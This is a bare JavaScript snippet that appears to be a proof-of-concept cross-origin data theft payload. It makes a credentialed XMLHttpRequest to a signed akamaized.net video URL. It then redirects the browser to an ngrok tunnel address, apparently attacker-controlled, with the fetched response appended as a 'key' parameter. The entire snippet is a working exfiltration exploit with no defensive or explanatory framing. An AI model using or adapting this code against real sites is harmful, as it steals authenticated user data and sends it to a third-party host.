var xhr = new XMLHttpRequest();

xhr.onload = reqListener; 
xhr.open("GET", "https://v16m-default.akamaized.net/c84a988341a13b603cb1e7e02e341c3c/64c97b72/video/tos/useast2a/tos-useast2a-pve-0068/489bed6921594495969f2e34b8bdb293/?a=0&ch=0&cr=0&dr=0&er=0&cd=0%7C0%7C0%7C0&cv=1&br=322&bt=161&cs=0&ds=3&ft=iJOG.y54ZfX0PD1ydQgXg9wj35MtJEeC~&mime_type=video_mp4&qs=5&rc=OGRkaWkzNDxlNGk0ZDZmaEBpanFldjY6ZmlsOjMzNzczM0BjY2JfYWIyXjExMy00LjRiYSNzY2tvcjRvMGNgLS1kMTZzcw%3D%3D&l=202308011538235434DB68A5BE024C2013&btag=e00088000");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();

function reqListener() {
    location='//ab84-202-162-37-174.ngrok-free.app/?key='+this.responseText; 
};
